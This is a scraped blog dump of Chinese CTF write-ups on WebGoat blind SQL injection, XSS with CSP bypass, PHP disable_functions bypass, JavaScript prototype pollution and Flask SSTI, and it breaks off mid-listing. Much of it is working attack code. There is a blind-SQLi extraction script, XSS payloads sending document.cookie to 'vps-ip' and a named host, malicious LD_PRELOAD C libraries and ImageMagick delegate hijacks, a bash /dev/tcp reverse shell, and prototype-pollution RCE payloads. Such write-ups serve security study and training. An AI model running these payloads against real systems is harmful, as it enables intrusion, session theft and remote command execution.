写个脚本 12345678910111213141516171819202122232425262728293031323334353637383940#!/usr/bin/env python2# coding=utf-8import requestsimport jsons = requests.session()cookies = &#123; 'JSESSIONID' :'XQ9kMiDyU_tr5apUdGewRRG4qIq7-5uQtiOObyRw'&#125;url = \"http://localhost:8080/WebGoat/SqlInjectionAdvanced/challenge\"headers = &#123; 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0'&#125;flag = \"\"tmp = 0for i in range(1, 100): if tmp == 1: break tmp = 1 for j in range(97, 127): payload = \"password\" param = \"tom' and ascii(substr((&#123;&#125;),&#123;&#125;,1))=&#123;&#125; and '1'='1\".format(payload, str(i), str(j)) print(param) data = &#123; 'username_reg':param, 'email_reg':'bb%40qq.com', 'password_reg':'cc', 'confirm_password_reg':'cc' &#125; r = requests.put(url=url, headers=headers, data=data, cookies=cookies) # r = requests.post(url=url, headers=headers, cookies=cookies, data=data) c = json.dumps(r.json()) # print(c) if \"already\" in c: tmp = 0 flag = flag + chr(j) print(flag) breakprint(flag) 最后，有空分析一下spring中的反序列化漏洞和FastJson反序列化漏洞，看了原理还是比较容易理解的。 参考链接： https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=42149&amp;fromuid=365932 https://www.freebuf.com/vuls/214039.html","categories":[],"tags":[{"name":"java","slug":"java","permalink":"https://glotozz.github.io/tags/java/"}]},{"title":"XSS&bypass CSP","slug":"XSS-bypass-CSP","date":"2020-02-27T02:01:25.000Z","updated":"2020-02-27T13:13:56.969Z","comments":true,"path":"2020/02/27/XSS-bypass-CSP/","link":"","permalink":"https://glotozz.github.io/2020/02/27/XSS-bypass-CSP/","excerpt":"从几道题学习XSS以及一些相关绕过姿势","text":"从几道题学习XSS以及一些相关绕过姿势 &nbsp; &nbsp; &nbsp;&nbsp;&nbsp;简陋的目录 hgame-Cosmos的聊天室1 hgame-Comcos聊天室2 RealWorld CTF2019-Mission Invisible RealWorld CTF2019-Hcorme CODEGATE 2020 CSP绕过 0ctf2018-h4xors.club2 参考链接： hgame-Cosmos的聊天室1环境关了，只能yy一下了==！ 过滤了所有闭合标签script、iframe等：re.sub(&quot;&lt;\\/?[^&gt;]+&gt;&quot;, &quot;&quot;, message),并转化为大写 用浏览器事件执行js，不闭合右标签时会自动补全 payload1 123&lt;svg&#x2F;onload&#x3D;&amp;#119&amp;#105&amp;#110&amp;#100&amp;#111&amp;#119&amp;#46&amp;#111&amp;#112&amp;#101&amp;#110&amp;#40&amp;#39&amp;#104&amp;#116&amp;#116&amp;#112&amp;#58&amp;#47&amp;#47&amp;#118&amp;#112&amp;#115&amp;#45&amp;#105&amp;#112&amp;#39&amp;#43&amp;#100&amp;#111&amp;#99&amp;#117&amp;#109&amp;#101&amp;#110&amp;#116&amp;#46&amp;#99&amp;#111&amp;#111&amp;#107&amp;#105&amp;#101&amp;#41&amp;#59&amp;#47&amp;#47 编码内容window.open(&#39;http://vps-ip&#39;+document.cookie);// payload2 引入外部页面 这个做法仅限chrome 1&lt;link rel=\"import\"href=\"http://vps-ip/\" 但是需要解决跨域问题，使用flask或者SimpleHTTPServer开个服务即可 1234567891011from flask import *app = Flask(__name__)@app.route('/')def hello_world(): response = make_response(\"&lt;script&gt;window.open('http://vps-ip/'+document.cookie)&lt;/script&gt;\") response.headers['Access-Control-Allow-Origin'] = '*' return responseif __name__ == '__main__': app.run(host=\"0.0.0.0\",port=80) 本地测试 hgame-Comcos聊天室2将script替换为空，双写绕过，但是出现报错 Refused to execute inline script because it violates the following ContentSecurity Policy directive: “script-src ‘self’”. Either the ‘unsafe-inline’keyword, a hash (‘sha256-bhHHL3z2vDgxUt0W3dWQOrprscmda2Y5pLsLg4GF+pI=’), or anonce (‘nonce-…’) is required to enable inline execution. 查看CSP策略 1Content-Security-Policy: default-src &#39;self&#39;; script-src &#39;self&#39; 它限制了内联 JS 脚本，并且限制了引入的静态资源文件只能从同域下加载。在实际应用中，遇到这种CSP ⼀般是找该站是否有文件上传点，上传⼀个内容为 alert(/xss/) 的图⽚再引用，也可以同源下有没有可以执行任意 JS 代码的 evil.js 文件。 本题中有⼀个接口 /send，它会返回过滤后的消息内容，我们可以利用 1&lt;scriscriptpt src&#x3D;&quot;&#x2F;send?message&#x3D;alert(1)&quot;&gt;&lt;&#x2F;scscriptript&gt; RealWorld CTF2019-Mission Invisible给了源码，核心是 123456789101112131415161718&lt;script&gt; function setElement(tag) &#123; tag = tag.substring(0, 1); var ele = document.createElement(tag) var attrs = getCookie(\"attrs\").split(\"&amp;\"); for (var i = 0; i &lt; attrs.length; i++) &#123; var key = attrs[i].split(\"=\")[0]; var value = attrs[i].split(\"=\")[1]; ele.setAttribute(key, value); &#125; document.body.appendChild(ele); &#125; var tag = getUrlParam(\"tag\"); setCookie(\"tag\", tag); setElement(tag);&lt;/script&gt; 可以构造一个标签并为其设置属性 只能使用a、p，但是需要使其自动触发，解决办法如下 1&lt;p onfocus&#x3D;&quot;alert(document.cookie)&quot; id&#x3D;&quot;1&quot; tabindex&#x3D;&quot;0&quot;&gt;&lt;&#x2F;p&gt; chrome测试成功 之后常规打cookie即可 RealWorld CTF2019-Hcorme 题目有一个callback的接口，能够把请求参数输出，并且是text/html形式。 两个限制：XSS Auditor、Content-Security-Policy: default-src &#39;self&#39;; object-src &#39;none&#39;; base-uri &#39;none&#39;; Hardold师傅的思路—&gt;utf-16编码绕过 因为在UTF-16文件的开首，都会放置一个U+FEFF字符作为Byte Order Mark（UTF-16LE以FF FE代表，UTF-16BE以FE FF代表），以显示这个文本文件是以UTF-16编码，它是个没有宽度也没有断字的空白。 猜测是类似截断的原理，从而bypass XSS Auditor 绕过CSP，是利用JSONP直接把js代码挂载到本地的script 会进行两次资源请求，第二次的资源类型是script 1print(quote((&#39;&lt;script&#x2F;src&#x3D;?callback&#x3D;alert(1)&gt;&lt;&#x2F;script&gt;&#39;).encode(&#39;utf-16&#39;))) CODEGATE 2020 CSP绕过前面是一个简单的正则绕过，发现存在CSP script-src &#39;none&#39; view.php提交到api.php，格式为name/p1/p2，可以设置header 解决办法：http状态码置为102时，CSP不会执行 颖奇师傅的payload 12345678910#author: 颖奇L'Amore#www.gem-love.comimport base64csp1 = str(base64.b64encode(b'header') ,encoding = \"utf8\")csp2 = str(base64.b64encode(b'HTTP/1.1'),encoding = \"utf8\")csp3 = str(base64.b64encode(b'102'),encoding = \"utf8\")name = str(base64.b64encode(b'body'),encoding = \"utf8\")xss = str(base64.b64encode(b'&lt;script\\n&gt;window.open(\"http://gem-love.com:12345/?\"+document.cookie);&lt;/script\\n&gt;'),encoding = \"utf8\")p3 = \"MQ==\" #p3 is uselessprint('|&#123;&#125;,&#123;&#125;,&#123;&#125;|&#123;&#125;,&#123;&#125;,&#123;&#125;'.format(csp1,csp2,csp3,name,xss,p3)) 0ctf2018-h4xors.club2发现看不懂==！以后再来补 最后给个分享个链接，遇到问题可以查一查：CSP策略及绕过方法 参考链接： https://www.anquanke.com/post/id/186707 https://github.com/vidar-team/Hgame2020_writeup/ https://www.gem-love.com/ctf/1329.html#CSP http://www.wupco.cn/?p=4408","categories":[],"tags":[{"name":"xss","slug":"xss","permalink":"https://glotozz.github.io/tags/xss/"}]},{"title":"从一道题学习bypass disable_func","slug":"从一道题学习bypass-disable-func","date":"2020-02-26T00:07:29.000Z","updated":"2020-02-27T10:30:11.142Z","comments":true,"path":"2020/02/26/从一道题学习bypass-disable-func/","link":"","permalink":"https://glotozz.github.io/2020/02/26/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0bypass-disable-func/","excerpt":"ctf和渗透经常会遇到需要bypass disable_func，借下面这道题学习下原理","text":"ctf和渗透经常会遇到需要bypass disable_func，借下面这道题学习下原理 &nbsp; &nbsp; &nbsp;&nbsp;&nbsp;简陋的目录 TCTF wallbreaker easy 一、dl()-拓展库绕过 二、imap_mail() 三、putenv() 四、ini_set 五、apache_setenv 参考链接： TCTF wallbreaker easy 很明显，给了我们一个后门，提示需要用Imagick来绕过disable_function，设置了open_basedir，先看看phpinfo() 对比禁用列表 1dl,exec,system,passthru,popen,proc_open,pcntl_exec,shell_exec,mail,imap_open,imap_mail,putenv,ini_set,apache_setenv,symlink,link =================分割线 加个error_log 1dl,exec,system,passthru,popen,proc_open,pcntl_exec,shell_exec,mail,imap_open,imap_mail,putenv,ini_set,apache_setenv,symlink,link,error_log =================分割线 函数对应的利用点 1234567常规绕过: exec、shell_exec、system、passthru、popen、proc_openld_preload绕过: mail、imap_mail、error_log、mb_send_mailpcntl_execimap_openfastcgicomapache mod-cgi 还存在下面5个 12345dlimap_mailputenvini_setapache_setenv 那么就对这个5个一一分析 一、dl()-拓展库绕过 实现方法参考：https://cloud.tencent.com/developer/article/1141142 版本 说明 7.0.0 PHP-FPM 模式下已禁用 dl()。 5.3.9 尽管不推荐，但 PHP-FPM 模式下启用了 dl()。 5.3.0 由于稳定性，dl() 在某些 SAPI 中被禁用。仅仅允许 dl() 的 SAPI 为 CLI 和 Embed。 使用 扩展加载指令 作为替代。 SAPI（Server Application Programming Interface）服务器应用程序编程接口，即PHP与其他应用交互的接口，PHP脚本要执行有很多方式，通过Web服务器，或者直接在命令行下，也可以嵌入在其他程序中。 SAPI提供了一个和外部通信的接口，常见的SAPI有：cgi、fast-cgi、cli、apache模块的DLL、isapi 1Server API FPM&#x2F;FastCGI 这里未开启dl，遂作罢 二、imap_mail() https://www.exploit-db.com/exploits/35146 适用于PHP &lt; 5.6.2的，遂作罢 三、putenv()putenv()可以设置环境变量 1putenv ( string $setting ) : bool 添加 setting 到服务器环境变量。 环境变量仅存活于当前请求期间。 在请求结束时环境会恢复到初始状态。 主要是和LD_PRELOAD打一套组合拳 LD_PRELOAD这个环境变量指定路径的文件，会在其他文件被调用前，最先被调用 1.制作一个恶意shared libraries2.使用putenv设置LD_PRELOAD为恶意文件路径3.使用某个php函数，触发specific shared library4.成功进行RCE 寻找一个能触发这个二进制文件的php函数 最常见的是mail() 123&lt;?php mail(&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;);?&gt; strace一下 1strace -f -e execve php a.php 得到 查看程序可能调用的系统API 1readelf -Ws &#x2F;usr&#x2F;sbin&#x2F;sendmail 有很多函数可以使用，这里可以选择geteuid() hack.c 123456789101112#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;void payload() &#123; system(&quot;ls &#x2F; &gt; &#x2F;tmp&#x2F;sky&quot;);&#125;int geteuid() &#123; if (getenv(&quot;LD_PRELOAD&quot;) &#x3D;&#x3D; NULL) &#123; return 0; &#125; unsetenv(&quot;LD_PRELOAD&quot;); payload();&#125; 这里要生成 shared libraries 12gcc -c -fPIC hack.c -o hackgcc --share hack -o hack.so 修改a.php 1234&lt;?php putenv(&quot;LD_PRELOAD&#x3D;.&#x2F;hack.so&quot;); mail(&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;);?&gt; 运行下，发现/tmp下生成了恶意文件，查看 进阶 即使没有安装sendmail也可以RCE，删除sendmail并修改hack1.c 123456789#define _GNU_SOURCE#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;sys&#x2F;types.h&gt;__attribute__ ((__constructor__)) void angel (void)&#123; unsetenv(&quot;LD_PRELOAD&quot;); system(&quot;ls&quot;);&#125; 所以当我们最开始将evil shared library load上后，就会触发__attribute__ ((__constructor__)) ，即使后面出现No such file or dicectory 本题中mail()被disable_func限制，提示php-imagick扩展 源码：https://github.com/ImageMagick/ImageMagick 因为知道要调用ffmpeg，github搜索即可 Makefile.nt 搜索mpeg 这里可以WMV为例 a.php 123&lt;?php $img &#x3D; new Imagick(&#39;sky.wmv&#39;);?&gt; 之后就是和上面类似的查看是否调用 注意的是wmv文件必须存在，否则无法调用ffmpeg hack1.c 123456789#define _GNU_SOURCE#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;sys&#x2F;types.h&gt;__attribute__ ((__constructor__)) void angel (void)&#123; unsetenv(&quot;LD_PRELOAD&quot;); system(&quot;&#x2F;readflag &gt; &#x2F;tmp&#x2F;d4dabdbc73b87e364e29e60c60a92900&#x2F;flag&quot;);&#125; 12gcc -c -fPIC hack1.c -o skygcc --share sky -o sky.so 本题中，先上传一个sky.so和1.wmv到/tmp/sandbox下 执行 12putenv(&quot;LD_PRELOAD&#x3D;&#x2F;tmp&#x2F;bd24f8b02aaf295daa247018d620ffe4&#x2F;sky.so&quot;);$img &#x3D; new Imagick(&#39;&#x2F;tmp&#x2F;bd24f8b02aaf295daa247018d620ffe4&#x2F;1.wmv&#39;); 其他解法： 一、覆盖delegate.xml 因为我们要执行/readflag，那么应该是通过系统命令，那么既然delagate.xml里面能够自定义要执行的命令，我们可以直接写delegate来让imagick当处理某个文件后缀时加载我们的delegate.xml，然后执行我们的command即可。 123&lt;delegatemap&gt; &lt;delegate decode&#x3D;&quot;ps:alpha&quot; command&#x3D;&quot;sh -c &quot;&#x2F;readflag &gt; &#x2F;tmp&#x2F;3accb9900a8be5421641fb31e6861f33&#x2F;flag.txt&quot;&quot;&#x2F;&gt;&lt;&#x2F;delegatemap&gt; 再执行 12putenv(&#39;MAGICK_CONFIGURE_PATH&#x3D;&#x2F;tmp&#x2F;3accb9900a8be5421641fb31e6861f33&#39;);$img &#x3D; new Imagick(&#39;&#x2F;tmp&#x2F;3accb9900a8be5421641fb31e6861f33&#x2F;1.ept&#39;); 二、覆盖子进程 比上一种更加深入一层 在delegate.xml定义中在decode ept文件时会调用gs，只要指定path为我们的gs的文件夹路径即可达成劫持的效果。 gs.c 12345678#include &lt;stdlib.h&gt;#include &lt;string.h&gt;int main() &#123; unsetenv(&quot;PATH&quot;); const char* cmd &#x3D; getenv(&quot;CMD&quot;); system(cmd); return 0;&#125; 编译后命名为gs即可，再上传个1.ept 1234putenv(&#39;PATH&#x3D;&#x2F;tmp&#x2F;3accb9900a8be5421641fb31e6861f33&#39;);putenv(&#39;CMD&#x3D;&#x2F;readflag &gt; &#x2F;tmp&#x2F;3accb9900a8be5421641fb31e6861f33&#x2F;flag.txt&#39;);chmod(&#39;&#x2F;tmp&#x2F;3accb9900a8be5421641fb31e6861f33&#x2F;gs&#39;,&#39;0777&#39;);$img &#x3D; new Imagick(&#39;&#x2F;tmp&#x2F;3accb9900a8be5421641fb31e6861f33&#x2F;1.ept&#39;); 三：利用 error_log 函数启动 sendmail 这里我们要用到的就是当 error_log 的第二个参数 message_type 的值为 1 的时候，会调用mail 函数的同一个内置函数(会执行sendmail 命令)的特性。 只需要将第一个mail()例子的hack.c修改成如下即可 1234&lt;?php putenv(&quot;LD_PRELOAD&#x3D;.&#x2F;hack.so&quot;); error_log(&#39;&#39;,1);?&gt; 四、ini_set可以用来绕过open_basedir 1chdir(&#39;img&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);echo(file_get_contents(&#39;flag&#39;)); 五、apache_setenv apache_setenv — 设置 Apache 子进程环境变量 当设置了某 Apache 环境变量, 相应的 $_SERVER 变量不会改变。 搜了下好像没有直接相关的漏洞==！ 最后放上两个常用的bypass链接 some exploits in php7 bypass disable_functions via LD_PRELOAD 参考链接： https://github.com/l3m0n/Bypass_Disable_functions_Shell https://www.cnblogs.com/tr1ple/p/11279895.html#Bjhbm2Rh https://skysec.top/2019/03/25/2019-0CTF-Web-WriteUp/#%E5%90%8E%E8%AE%B0","categories":[],"tags":[{"name":"bypass","slug":"bypass","permalink":"https://glotozz.github.io/tags/bypass/"}]},{"title":"JavaScript原型链污染","slug":"JavaScript原型链污染","date":"2020-02-25T02:51:11.000Z","updated":"2020-02-27T10:52:27.692Z","comments":true,"path":"2020/02/25/JavaScript原型链污染/","link":"","permalink":"https://glotozz.github.io/2020/02/25/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/","excerpt":"这次公益赛考到了JavaScript原型链污染，之前看的文章都是纸上谈兵，花点时间来学习记录下。","text":"这次公益赛考到了JavaScript原型链污染，之前看的文章都是纸上谈兵，花点时间来学习记录下。 &nbsp; &nbsp; &nbsp;&nbsp;&nbsp;简陋的目录 原理 公益赛Ez epress Codebreaking-thejs 总结 参考链接： 原理原型 123function A(name)&#123; this.name &#x3D; &#39;a&#39;;&#125; 在javascript中,每个对象的都有一个指向他的原型(prototype)的内部链接，这个原型对象又有它自己的原型，直到null为止 在javascript中一切皆对象，因为所有的变量，函数，数组，对象 都始于object的原型即object.prototype。同时，在js中只有类才有prototype属性，而对象却没有，对象有的是__proto__和类的prototype对应。 且二者是等价的 类 数组 上面就是两条完整的原型链，都会指向object，再指向null 再举个原型链搜索的例子 1234567function y()&#123; this.a &#x3D; &#39;a&#39;; this.b &#x3D; &#39;b&#39;;&#125;j &#x3D; new y;y.prototype.c &#x3D; &#39;c&#39;;console.log(j.c) 这个例子中先new了一个对象j，之后再y中添加c，但是仍然打印出了c 当要使用或输出一个变量时：首先会在本层中搜索相应的变量，如果不存在的话，就会向上搜索，即在自己的父类中搜索，当父类中也没有时，就会向祖父类搜索，直到指向null，如果此时还没有搜索到，就会返回 undefined 再举个原型链污染的例子 123456a &#x3D; &#123;&#39;b&#39;:1&#125;console.log(a.b)a.__proto__.b &#x3D; 2console.log(a.b)c &#x3D; &#123;&#125;console.log(c.b) 修改a的原型即Object的属性b=2，第一次打印a.b根据搜索顺序为b=1，之后new了一个字典对象即Object，因此属性b=2 再举个原型链污染触发的例子 1234567891011121314151617function merge(target, source) &#123; for (let key in source) &#123; if (key in source &amp;&amp; key in target) &#123; merge(target[key], source[key]) &#125; else &#123; target[key] &#x3D; source[key] &#125; &#125;&#125;let o1 &#x3D; &#123;&#125;;let o2 &#x3D; &#123;a:1,&quot;__proto__&quot;:&#123;b:2&#125;&#125;;merge(o1,o2);console.log(o1.a,o1.b);o3 &#x3D; &#123;&#125;;console.log(o3.b); 当key为__proto__即可原型链污染 理论上执行：o1.a = 1 o1.__proto__.b = 2 输出应该是1，2 和 2 执行一下 原因是这里o2 = {a:1,&quot;__proto__&quot;:{b:2}};是给o2的原型赋值属性b=2，相当于 o2 = {a:1,b:2} 解决这个问题需要使__proto__作为键名 o2 = JSON.parse(&#39;{&quot;a&quot;:1,&quot;__proto__&quot;:{&quot;b&quot;:2}}&#39;) Nodejs的RCE 调用child_process模块来执行系统命令 12global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;your_vps&#x2F;8888 0&gt;&amp;1&quot;&#39;)global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;bash -c &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;your_vps&#x2F;8888 0&gt;&amp;1&quot;&#39;) 利用方式一般是object的某个属性为上面的模块并被调用 上面都是原理，下面分析几道题 公益赛Ez epressregister需要满足小写不等于admin，之后toUpperCase()存入session，再与ADMIN比较 javascript大小写特性绕过： https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html 成功登录后，继续分析代码，发现 1234567891011121314151617181920const merge &#x3D; (a, b) &#x3D;&gt; &#123; for (var attr in b) &#123; if (isObject(a[attr]) &amp;&amp; isObject(b[attr])) &#123; merge(a[attr], b[attr]); &#125; else &#123; a[attr] &#x3D; b[attr]; &#125; &#125; return a&#125;const clone &#x3D; (a) &#x3D;&gt; &#123; return merge(&#123;&#125;, a);&#125;...req.session.user.data &#x3D; clone(req.body);router.get(&#39;&#x2F;info&#39;, function (req, res) &#123; res.render(&#39;index&#39;,data&#x3D;&#123;&#39;user&#39;:res.outputFunctionName&#125;);&#125;) /action污染原型链 /info触发污染的原型链 设置object的outputFunctionName的属性：{&quot;__proto__&quot;:{&quot;outputFunctionName&quot;:&quot;xxx&quot;}} payload 1&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \\&quot;cat &#x2F;flag &gt; &#x2F;app&#x2F;public&#x2F;flag\\&quot;&#39;);var __tmp2&quot;&#125;&#125; 失败了，就想调试下js，本地搭建 12#安装模块npm install 发现没有提供端口启动，原文件是利用bin/www里面启动的，为了方便直接添加 1234567&#x2F;&#x2F;监听端口为3000var server &#x3D; app.listen(3000, function () &#123; var host &#x3D; server.address().address; var port &#x3D; server.address().port; console.log(&#39;Example app listening at http:&#x2F;&#x2F;%s:%s&#39;, host, port);&#125;); node --inspect --debug-brk app.js启动即可利用chrome自带的调试 nodejs调试 未merge()前 merge()后 看下源码才注意到req.session.user.data = clone(req.body); 是整个body。。。修改请求体即可 之前的payload失败是因为没有用json格式发送==！ 访问/info触发原型链，访问/flag下载即可 Codebreaking-thejsserver.js 123456789101112131415161718192021222324252627282930313233343536373839404142const fs &#x3D; require(&#39;fs&#39;)const express &#x3D; require(&#39;express&#39;)const bodyParser &#x3D; require(&#39;body-parser&#39;)const lodash &#x3D; require(&#39;lodash&#39;)const session &#x3D; require(&#39;express-session&#39;)const randomize &#x3D; require(&#39;randomatic&#39;)const app &#x3D; express()app.use(bodyParser.urlencoded(&#123;extended: true&#125;)).use(bodyParser.json())app.use(&#39;&#x2F;static&#39;, express.static(&#39;static&#39;))app.use(session(&#123; name: &#39;thejs.session&#39;, secret: randomize(&#39;aA0&#39;, 16), resave: false, saveUninitialized: false&#125;))app.engine(&#39;ejs&#39;, function (filePath, options, callback) &#123; &#x2F;&#x2F; define the template engine fs.readFile(filePath, (err, content) &#x3D;&gt; &#123; if (err) return callback(new Error(err)) let compiled &#x3D; lodash.template(content) let rendered &#x3D; compiled(&#123;...options&#125;) return callback(null, rendered) &#125;)&#125;)app.set(&#39;views&#39;, &#39;.&#x2F;views&#39;)app.set(&#39;view engine&#39;, &#39;ejs&#39;)app.all(&#39;&#x2F;&#39;, (req, res) &#x3D;&gt; &#123; let data &#x3D; req.session.data || &#123;language: [], category: []&#125; if (req.method &#x3D;&#x3D; &#39;POST&#39;) &#123; data &#x3D; lodash.merge(data, req.body) req.session.data &#x3D; data &#125; res.render(&#39;index&#39;, &#123; language: data.language, category: data.category &#125;)&#125;)app.listen(3000, () &#x3D;&gt; console.log(&#96;Example app listening on port 3000!&#96;)) 使用 lodash 实现了一个简单的 ejs 模版引擎，在请求的时候渲染。 lodash这个模块提供了两个工具lodash.template和lodash.merge，分别可用来进行原型链污染和原型链触发 merge就可以想到之前分析的原型链污染的触发点，因为这是一个express框架，支持Json直接传输数据，并且接收的参数为req.body lodash.template的源码 https://github.com/lodash/lodash/blob/a039483886093788e7021131a9cba6ffc53f45ec/lodash.template/index.js#L1089 1234var result &#x3D; attempt(function() &#123; return Function(importsKeys, sourceURL + &#39;return &#39; + source) .apply(undefined, importsValues);&#125;); 追踪sourceURL 1var sourceURL &#x3D; &#39;sourceURL&#39; in options ? &#39;&#x2F;&#x2F;# sourceURL&#x3D;&#39; + options.sourceURL + &#39;\\n&#39; : &#39;&#39;; 其中 option 为我们在模版引擎中，渲染的值。这里读取其中的 sourceURL 属性的值，我们就可以通过这里触发原型污染 payload 1&#123;&quot;constructor&quot;:&#123;&quot;prototype&quot;:&#123;&quot;sourceURL&quot;:&quot;\\r\\nreturn e &#x3D;&gt;&#123;return global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;id&#39;);&#125;&quot;&#125;&#125;&#125; 总结简单学习了JavaScript原型链污染的原理以及两道简单的题，下一步学习可以是一些源码更加复杂，或者与其他漏洞结合利用。 参考链接： https://www.anquanke.com/post/id/176884 https://nikoeurus.github.io/2019/11/30/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/","categories":[],"tags":[{"name":"js","slug":"js","permalink":"https://glotozz.github.io/tags/js/"}]},{"title":"flask模版注入","slug":"flask模版注入","date":"2020-02-24T01:11:15.000Z","updated":"2020-03-06T02:02:31.789Z","comments":true,"path":"2020/02/24/flask模版注入/","link":"","permalink":"https://glotozz.github.io/2020/02/24/flask%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5/","excerpt":"比赛时遇到flask ssti，遂复习一下","text":"比赛时遇到flask ssti，遂复习一下 &nbsp; &nbsp; &nbsp;&nbsp;&nbsp;简陋的目录 简述 Python2 Python3 Some Tricks（测试环境为Py2） 总结 参考链接： 简述 漏洞原理参考 漏洞原理用一句话概括：不正确的使用flask中的render_template_string()导致的SSTI，并且模板内容直接受用户控制 这篇文章主要是借flask SSTI复习下python沙盒逃逸，整理下payload，理论上不同机器、不同python版本的payload是不尽相同的。 测试代码 1234567@app.route('/')def test(): code = request.args.get('id') html = ''' &lt;h3&gt;%s&lt;/h3&gt; '''%(code) return render_template_string(html) 两种启动方式： flask run --host=0.0.0.0，需要启动的时候设置host，app.run()中更改无效 python app.py，在app.run()中设置host，切换python版本比较方便 确认正常访问 全局变量 ,比较常见的读取是SECRET_KEY 文件读取/命令执行 无论是实现文件读取还是命令执行，需要利用对象的继承，先找到父类&lt;type &#39;object&#39;&gt;，再寻找子类，最后找到我们需要用到的相应模块 几个要用到的魔术方法 12345678__class__ 返回类型所属的对象__mro__ 返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。__base__ 返回该对象所继承的基类&#x2F;&#x2F; __base__和__mro__都是用来寻找基类的__subclasses__ 每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表__init__ 类的初始化方法__globals__ 对包含函数全局变量的字典的引用 Python2先测试Python 2.7.17 需要先选取一个类，几种常见的类&#39;&#39;、request、[]、() 1、获取类对象 123456789&gt;&gt;&gt; &#39;&#39;.__class__&lt;type &#39;str&#39;&gt;&gt;&gt;&gt; import request&gt;&gt;&gt; request.__class__&lt;type &#39;module&#39;&gt;&gt;&gt;&gt; [].__class__&lt;type &#39;list&#39;&gt;&gt;&gt;&gt; ().__class__&lt;type &#39;tuple&#39;&gt; 2、寻找基类object 12345678910111213&gt;&gt;&gt; &#39;&#39;.__class__.__mro__(&lt;type &#39;str&#39;&gt;, &lt;type &#39;basestring&#39;&gt;, &lt;type &#39;object&#39;&gt;)&gt;&gt;&gt; request.__class__.__mro__(&lt;type &#39;module&#39;&gt;, &lt;type &#39;object&#39;&gt;)&gt;&gt;&gt; [].__class__.__mro__(&lt;type &#39;list&#39;&gt;, &lt;type &#39;object&#39;&gt;)&gt;&gt;&gt; ().__class__.__mro__(&lt;type &#39;tuple&#39;&gt;, &lt;type &#39;object&#39;&gt;)&gt;&gt;&gt; [].__class__.__base__&lt;type &#39;object&#39;&gt;&gt;&gt;&gt; ().__class__.__base__&lt;type &#39;object&#39;&gt; object在最底层故在列表中的最后，通过__mro__[-1]可以获取到 3、寻找可用的引用 12&gt;&gt;&gt; &#39;&#39;.__class__.__mro__[2].__subclasses__()[&lt;type &#39;type&#39;&gt;, &lt;type &#39;weakref&#39;&gt;, &lt;type &#39;weakcallableproxy&#39;&gt;, &lt;type &#39;weakproxy&#39;&gt;, &lt;type &#39;int&#39;&gt;, &lt;type &#39;basestring&#39;&gt;, &lt;type &#39;bytearray&#39;&gt;, &lt;type &#39;list&#39;&gt;, &lt;type &#39;NoneType&#39;&gt;, &lt;type &#39;NotImplementedType&#39;&gt;, &lt;type &#39;traceback&#39;&gt;, &lt;type &#39;super&#39;&gt;, &lt;type &#39;xrange&#39;&gt;, &lt;type &#39;dict&#39;&gt;, &lt;type &#39;set&#39;&gt;, &lt;type &#39;slice&#39;&gt;, &lt;type &#39;staticmethod&#39;&gt;, &lt;type &#39;complex&#39;&gt;, &lt;type &#39;float&#39;&gt;, &lt;type &#39;buffer&#39;&gt;, &lt;type &#39;long&#39;&gt;, &lt;type &#39;frozenset&#39;&gt;, &lt;type &#39;property&#39;&gt;, &lt;type &#39;memoryview&#39;&gt;, &lt;type &#39;tuple&#39;&gt;, &lt;type &#39;enumerate&#39;&gt;, &lt;type &#39;reversed&#39;&gt;, &lt;type &#39;code&#39;&gt;, &lt;type &#39;frame&#39;&gt;, &lt;type &#39;builtin_function_or_method&#39;&gt;, &lt;type &#39;instancemethod&#39;&gt;, &lt;type &#39;function&#39;&gt;, &lt;type &#39;classobj&#39;&gt;, &lt;type &#39;dictproxy&#39;&gt;, &lt;type &#39;generator&#39;&gt;, &lt;type &#39;getset_descriptor&#39;&gt;, &lt;type &#39;wrapper_descriptor&#39;&gt;, &lt;type &#39;instance&#39;&gt;, &lt;type &#39;ellipsis&#39;&gt;, &lt;type &#39;member_descriptor&#39;&gt;, &lt;type &#39;file&#39;&gt;, &lt;type &#39;PyCapsule&#39;&gt;, &lt;type &#39;cell&#39;&gt;, &lt;type &#39;callable-iterator&#39;&gt;, &lt;type &#39;iterator&#39;&gt;, &lt;type &#39;sys.long_info&#39;&gt;, &lt;type &#39;sys.float_info&#39;&gt;, &lt;type &#39;EncodingMap&#39;&gt;, &lt;type &#39;fieldnameiterator&#39;&gt;, &lt;type &#39;formatteriterator&#39;&gt;, &lt;type &#39;sys.version_info&#39;&gt;, &lt;type &#39;sys.flags&#39;&gt;, &lt;type &#39;exceptions.BaseException&#39;&gt;, &lt;type &#39;module&#39;&gt;, &lt;type &#39;imp.NullImporter&#39;&gt;, &lt;type &#39;zipimport.zipimporter&#39;&gt;, &lt;type &#39;posix.stat_result&#39;&gt;, &lt;type &#39;posix.statvfs_result&#39;&gt;, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &lt;class 